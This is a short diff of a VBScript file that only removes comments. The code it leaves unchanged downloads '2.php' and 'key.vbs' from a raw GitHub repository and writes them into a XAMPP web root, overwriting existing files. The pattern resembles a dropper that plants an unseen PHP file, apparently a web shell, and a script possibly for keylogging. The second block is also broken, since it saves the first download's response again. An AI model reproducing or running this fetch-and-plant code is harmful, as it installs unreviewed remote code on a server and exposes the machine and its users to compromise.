@@ -4,10 +4,10 @@ xHttp.Open "GET", "https://raw.githubusercontent.com/lNobodyl/a/master/2.php", F
 xHttp.Send
 
 with bStrm
-    .type = 1 '//binary
+    .type = 1 
     .open
     .write xHttp.responseBody
-    .savetofile "c:\xampp\htdocs\2.php", 2 '//overwrite
+    .savetofile "c:\xampp\htdocs\2.php", 2 
 end with
 
 WScript.Sleep 4000
@@ -19,10 +19,10 @@ xaHttp.Open "GET", "https://raw.githubusercontent.com/lNobodyl/a/master/key.vbs"
 xaHttp.Send
 
 with baStrm
-    .type = 1 '//binary
+    .type = 1 
     .open
     .write xHttp.responseBody
-    .savetofile "c:\xampp\htdocs\key.vbs", 2 '//overwrite
+    .savetofile "c:\xampp\htdocs\key.vbs", 2 
 end with
 WScript.Sleep 4000
 
